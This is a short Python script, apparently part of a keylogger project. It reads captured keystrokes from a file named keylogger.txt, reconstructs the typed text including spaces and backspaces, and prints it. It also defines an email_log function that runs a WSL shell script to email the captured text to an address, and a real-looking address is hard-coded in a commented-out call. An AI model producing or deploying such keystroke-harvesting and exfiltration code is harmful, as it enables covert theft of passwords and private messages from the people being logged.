#!/usr/bin/env python3

import re
import subprocess

def main():
    filename = "keylogger.txt"
    content = ""

    try:
        with open(filename, "r") as keylog:
            keylog_content = keylog.readlines()
            for line in keylog_content:
                if line.strip() == "Key.space":
                    content += " "
                elif line.strip() == "Key.backspace":
                    content = content[:-1]
                else:
                    keys = line.split(" + ")
                    for key in keys:
                        if key.strip().isascii() and len(key.strip()) == 1:
                            content += key.strip()
            
            # email_log(content, "ptandjiria@gmail.com")
            print(content)

    except IOError:
        print(f"An error occurred")

def email_log(body, email_addr):
    try:
        result = subprocess.run(
            ["wsl", "bash", "./email_keylog.sh", body, email_addr],
            text=True,
            capture_output=True
        )
        # Print the output and error for debugging purposes
        print("Output:", result.stdout)
        print("Error:", result.stderr)
    except Exception as e:
        print(f"An error occurred while sending the email: {e}")


if __name__ == "__main__":
    main()